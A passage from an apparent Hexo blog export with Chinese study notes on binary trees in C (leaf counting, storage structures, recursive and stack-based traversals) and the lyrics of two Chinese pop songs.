    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"><a href="#分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数" class="headerlink" title="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"></a>分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数</h3><p><strong><code>bintree.h</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *a; </span><br><span class="line"><span class="comment">/* 如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字 extern 对该变量作“外部变量声明”，表示该变量是一个已经定义的外部变量 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式存储，不带双亲</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;binnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> binnode *bintree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的 创建</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(bintree *t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = *a++;</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        *t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *t = (bintree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(binnode));</span><br><span class="line">        (*t)-&gt;data = ch;</span><br><span class="line">        create(&amp;(*t)-&gt;lchild);</span><br><span class="line">        create(&amp;(*t)-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序 递归 遍历 二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    bintree data[N];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化 顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top &gt; <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//不为空</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否 满</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">full</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == N<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//满</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//不满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!full(s))</span><br><span class="line">        s-&gt;data[++s-&gt;top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!empty(s))</span><br><span class="line">        <span class="keyword">return</span> s-&gt;data[s-&gt;top--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>333.cpp</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归方法求 二叉树 叶子结点的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    	 <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">return</span> lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归方法 求 二叉树 叶子结点的 个数  (需要使用到顺序栈)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_2</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    init(&amp;s);</span><br><span class="line">    <span class="keyword">while</span>(t || !empty(&amp;s))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">                count++;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bintree t;</span><br><span class="line">    create(&amp;t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_1(t));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;非递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_2(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p>
<p>以上面的二叉树为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/06/cMHT2U5hE6zfgjO.png" alt="image-20211106112844209"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。</p>
<p>空二叉树</p>
<p><strong>二叉树五种基本形态</strong></p>
<p><img src="https://i.loli.net/2021/10/30/QzNZd9lI8VtuiMG.png" alt="image-20211030164242923"></p>
<blockquote>
<p><strong>二叉树与一般的树型结构的区别在于：</strong></p>
<ul>
<li>二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多<br>个子女;</li>
<li>二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指<br>出是左子树还是右子树。</li>
</ul>
</blockquote>
<h2 id="1-2-二叉树-性质"><a href="#1-2-二叉树-性质" class="headerlink" title="1.2 二叉树 性质"></a>1.2 二叉树 性质</h2><ul>
<li><p><strong>性质1：</strong>一棵非空二叉树的 <code>第i层</code>  上至多有 <code>2 的 i-1 次方</code>  个 结点 (i≥1)。</p>
</li>
<li><p><strong>性质2：</strong>深度为h的二叉树至多有 <code>2 的 h 次方 -1</code> 个结点(h&gt;1) 。</p>
</li>
<li><p><strong>性质3：</strong> 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。</p>
</li>
<li><p><strong>性质4：</strong>具有 n 个结点的完全二叉树的深度 是 <code>[log以2为底n的对数] + 1</code></p>
</li>
</ul>
<p><strong>其它性质：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/4kDm5FiaLGntrZe.png" alt="image-20211030164825001"></p>
<p><strong>完全二叉树、满二叉树：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/9pg6GoC28vPEsVu.png" alt="image-20211030164916049"></p>
<p><strong>完全二叉树的性质：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/d7EBmp4CgeXqG58.png" alt="image-20211030165111674"></p>
<h2 id="1-3-二叉树的-存储结构"><a href="#1-3-二叉树的-存储结构" class="headerlink" title="1.3 二叉树的 存储结构"></a>1.3 二叉树的 存储结构</h2><h3 id="1-3-1-完全二叉树-的-顺序存储"><a href="#1-3-1-完全二叉树-的-顺序存储" class="headerlink" title="1.3.1 完全二叉树 的 顺序存储"></a>1.3.1 完全二叉树 的 顺序存储</h3><p>按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 <strong>一维数组</strong> 中。</p>
<p>利用完全二叉树的性质</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;  <span class="comment">//二叉树结点类型</span></span><br><span class="line">datatype tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;  <span class="comment">//树 实际所含结点个数</span></span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/10/30/f6vuodkaFwZjc9Y.png" alt="image-20211030165424030"></p>
<h3 id="1-3-2-一般二叉树-的-顺序存储"><a href="#1-3-2-一般二叉树-的-顺序存储" class="headerlink" title="1.3.2 一般二叉树 的 顺序存储"></a>1.3.2 一般二叉树 的 顺序存储</h3><p>每个结点：三个域</p>
<p>值域：data</p>
<p><strong>不带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     <span class="comment">//结点值类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;  <span class="comment">//存放 左、右 子女下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];  </span><br><span class="line"><span class="keyword">int</span> n;			<span class="comment">//树中实际所含结点个数</span></span><br><span class="line"><span class="keyword">int</span> root;		<span class="comment">//存放根结点的下标</span></span><br></pre></td></tr></table></figure>

<p><strong>带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="keyword">int</span> parent;  <span class="comment">//存放双亲结点下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> root;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p>
<h3 id="1-3-2-链式存储"><a href="#1-3-2-链式存储" class="headerlink" title="1.3.2 链式存储"></a>1.3.2 链式存储</h3><p>每个结点：三个域</p>
<p>值域：data</p>
<p>指针域：分别指向左右子树</p>
<p><strong>不带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>    <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;</span><br></pre></td></tr></table></figure>

<p><strong>带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span>  <span class="comment">//指向双亲的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;				<span class="comment">//指向二叉树根结点的指针</span></span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/10/30/mFjtMqDdRkezGc2.png" alt="image-20211030170230015"></p>
<h2 id="1-4-二叉树的遍历-—–-递归实现"><a href="#1-4-二叉树的遍历-—–-递归实现" class="headerlink" title="1.4 二叉树的遍历  —– 递归实现"></a>1.4 二叉树的遍历  —– 递归实现</h2><p>按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。</p>
<p><img src="https://i.loli.net/2021/10/30/YIS3fLvetOKocgH.png" alt="image-20211030171335598"></p>
<h3 id="1-4-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-4-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.4.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.4.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-4-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.4.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.4.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-4-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.4.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.4.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-二叉树的创建"><a href="#1-5-二叉树的创建" class="headerlink" title="1.5 二叉树的创建"></a>1.5 二叉树的创建</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintree *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br></pre></td></tr></table></figure>

<h2 id="1-6-二叉树的遍历-—–-非递归实现"><a href="#1-6-二叉树的遍历-—–-非递归实现" class="headerlink" title="1.6 二叉树的遍历  —– 非递归实现"></a>1.6 二叉树的遍历  —– 非递归实现</h2><p>二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。</p>
<p><strong>使用一个 <code>栈</code> 来进行回溯</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];		<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;			<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  		<span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-6-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.6.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.6.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><ul>
<li><p>当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。</p>
</li>
<li><p>当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;		<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-6-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.6.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.6.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><ul>
<li><p>首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。</p>
</li>
<li><p>当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-6-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.6.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.6.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><ul>
<li><p>首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。</p>
</li>
<li><p>需要使用 <code>seqstack类型  中的  数组 tag</code> ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。</p>
<p>当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>像真的一样</title>
    <url>/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你习惯 可能会幸福的预感</p>
<p>你期盼 等暧昧过完 能改写身份这一栏</p>
<p>你鼻酸 就算都与你无关</p>
<p>他心烦 你跟着想要呐喊</p>
<p>恋人们的手说放就放</p>
<p>知己就没分手的情况</p>
<p>能在彼此身旁</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p>他清场 他怯场 他离场 你都是暖场</p>
<p>边拐弯 打听关于爱的答案</p>
<p>边感叹 感情的艰难 却对感情避而不谈</p>
<p>另一半 若像是太阳一般</p>
<p>天一寒 怎么向你来取暖</p>
<p>恋人们的手说放就放</p>
<p>遗憾转身就遗忘</p>
<p>你还在他身旁</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p>他清场 他怯场 他离场 你都是暖场</p>
<p>消音的话 只会更强化 不能没有他</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p><strong>他清场 他怯场 他离场 你都是暖场</strong></p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>保留</title>
    <url>/2021/10/10/%E4%BF%9D%E7%95%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p>
<p>作曲 : 郭顶</p>
<p>看见 你在我眼前</p>
<p>不去猜想我们隔多远</p>
<p>当我 夜幕中准备</p>
<p>只想让沉默的能开解</p>
<p>在不同的遭遇里我发现你的瞬间</p>
<p>有种不可言说的温柔直觉</p>
